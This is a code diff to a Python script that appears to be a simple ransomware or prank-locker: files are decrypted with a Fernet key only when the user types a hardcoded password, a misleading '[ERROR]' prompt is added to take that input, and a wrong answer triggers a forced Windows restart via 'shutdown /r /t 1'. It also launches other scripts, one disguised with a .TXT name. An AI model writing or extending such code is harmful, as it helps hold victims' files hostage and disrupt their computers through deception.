@@ -1,6 +1,6 @@
 import time
 from subprocess import call
-call(["python", "End.py"])
+call(["python", "YourAcutie.TXT"])
 
 import os
 from cryptography.fernet import Fernet
@@ -180,10 +180,16 @@ print(" ")
 print(" ")
 print(" ")
 print(" ")
+
+
 time.sleep(5)
 # Password to run the script. DO NOT USE THIS AS THE DECRIPT PASSWORD
 password = "pASS?0wRd"
 call(["python", "Last.py"])
+
+
+userInput = input("[ERROR]\n")
+time.sleep(2)
 
 # Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
 # and if its wrong a message saying that the password is wrong
@@ -194,3 +200,9 @@ if userInput == password:
 		contents_decrypted = Fernet(secretkey).decrypt(contents)
 		with open(file, "wb") as thefile:
 			thefile.write(contents_decrypted)
+	print("Restart your PC")
+
+else:
+	time.sleep(5)
+	print("Restarting your PC")
+	os.system("shutdown /r /t 1")	
